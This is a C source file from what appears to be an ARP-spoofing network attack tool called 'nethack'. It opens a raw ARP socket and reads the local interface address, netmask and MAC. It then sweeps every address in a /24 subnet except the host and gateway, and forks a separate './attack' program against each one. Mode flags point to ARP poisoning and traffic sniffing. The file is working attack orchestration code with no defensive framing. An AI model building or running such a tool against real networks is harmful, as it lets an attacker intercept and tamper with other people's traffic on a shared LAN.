#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "nethack.h"

/***********************************************************
 * network_analysis()
 **********************************************************/
int network_analysis(handle *hand, char *interface, char *gateway)
{
	int fd;
	struct ifreq req;

	memset(hand, 0x00, sizeof(handle));

	hand->mode = 0;
#if 0
	switch (mode)
	{
	case 0:
	default :
		hand->mode = MODE_NONE;
		break;
	case 1:
		hand->mode = MODE_ARP1;
		break;
	case 2:
		hand->mode = (MODE_ARP1 | MODE_ARP2);
		break;
	case 3:
		hand->mode = (MODE_ARP1 | MODE_ARP2 | MODE_PSND);
		break;
	case 4:
		hand->mode = MODE_SNIF;
		break;
	case 5:
		hand->mode = (MODE_ARP1 | MODE_FRAG | MODE_SNIF);
		break;
	}
#endif

	fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if(fd == -1) {
		perror("socket: ");
		return -1;
	}

	strcat(hand->interface, interface);
	hand->gateway.s_addr = inet_addr(gateway);

	bzero(&req, sizeof(struct ifreq));
	strcpy(req.ifr_ifrn.ifrn_name, interface);

	if(ioctl(fd, SIOCGIFADDR, &req) == -1) {
		perror("SIOCGIFADDR: ");
		return -1;
	}
	memcpy(&hand->host, req.ifr_ifru.ifru_addr.sa_data + 2, 4);

	if(ioctl(fd, SIOCGIFNETMASK, &req) == -1) {
		perror("SIOCGIFNETMASK: ");
		return -1;
	}
	memcpy(&hand->netmask, req.ifr_ifru.ifru_netmask.sa_data + 2, 4);

#if 1
	/* C class */
	if (htonl(hand->netmask.s_addr) == 0xffffff00)
	{
		//printf("ipscan_all\n");
		//hand->ipscan = ipscan_all;
	}
	else
	{
		//printf("ipscan_one\n");
		printf("nethack impossible\n");
		return -1;
		//hand->ipscan = ipscan_one;
	}
#else
	hand->ipscan = ipscan_all;
#endif

	if(ioctl(fd, SIOCGIFHWADDR, &req) == -1) {
		perror("SIOCGIFHWADDR: ");
		return -1;
	}
	memcpy(hand->mac, req.ifr_ifru.ifru_hwaddr.sa_data, 6);

	close(fd);
	return 0;
}

/***********************************************************
 * network_analysis()
 **********************************************************/
int network_search(handle *hand)
{
	unsigned char ip_client[4];
    unsigned char mac_client[6];
    unsigned char netmask_client[4];
    unsigned char ip_ser[4];
    uint32_t ip_n, netmask_n, ip_start_n, ip_stop_n;
    int ii, tidx=0, nrec, result;
    struct in_addr ipaddr;
	char target[16];

    for (ii = 0; ii < 4; ii++)
    {
        ip_client[ii] = (htonl(hand->host.s_addr) >> ((3 - ii) * 8)) & 0xFF;
    }

    for (ii = 0; ii < 4; ii++)
    {
        netmask_client[ii] = (htonl(hand->netmask.s_addr) >> ((3 - ii) * 8)) & 0xFF;
    }

    memcpy(mac_client, hand->mac, 6);

#if 0
    printf("my [%d.%d.%d.%d] [%02x:%02x:%02x:%02x:%02x:%02x] netmask[%d.%d.%d.%d]\n",
        ip_client[0], ip_client[1], ip_client[2], ip_client[3],
        mac_client[0], mac_client[1], mac_client[2],
        mac_client[3], mac_client[4], mac_client[5],
        netmask_client[0], netmask_client[1], netmask_client[2], netmask_client[3]);
#endif

    ip_n = ntohl(*((uint32_t *)ip_client));
    netmask_n = ntohl(*((uint32_t *)netmask_client));

    ip_start_n = (ip_n & netmask_n) + 1;
    ip_stop_n = ((ip_n & netmask_n) | (~netmask_n));

    while (1)
    {
        if(ip_start_n >= ip_stop_n)
            break;

        for (ii = 0; ii < 4; ii++)
        {
            ip_ser[ii] = (ip_start_n >> ((3 - ii) * 8)) & 0xFF;
        }

        if (htonl(hand->host.s_addr) == ntohl(*((uint32_t *)ip_ser)))
        {
            ip_start_n++;
            continue;
        }

        if (htonl(hand->gateway.s_addr) == ntohl(*((uint32_t *)ip_ser)))
        {
            ip_start_n++;
            continue;
        }

		memset(target, 0x00, sizeof(target));
		sprintf(target, "%d.%d.%d.%d", ip_ser[0], ip_ser[1], ip_ser[2], ip_ser[3]);
		
//printf("!!![%d.%d.%d.%d]\n", ip_ser[0], ip_ser[1], ip_ser[2], ip_ser[3]);
		network_attack(hand, target);
		usleep(50000);

        tidx++;
        ip_start_n++;
    }

    return 0;
}

/***********************************************************
 * network_attack()
 **********************************************************/
int network_attack(handle *hand, char *target)
{
	int pid;

	pid = fork();
	switch (pid)
	{
	case -1:
		return -1;
	case 0:
		/* child */
#if 1
		execl("./attack", "./attack", hand->interface, 
				inet_ntoa(hand->gateway), target, NULL);
#else
		execl("./attack", "./attack", hand->interface, target, 
			inet_ntoa(hand->gateway), NULL);
#endif
		printf("execl error\n");
		exit(-1);
	default:
		/* parent */
		break;
	}

	return 0;
}

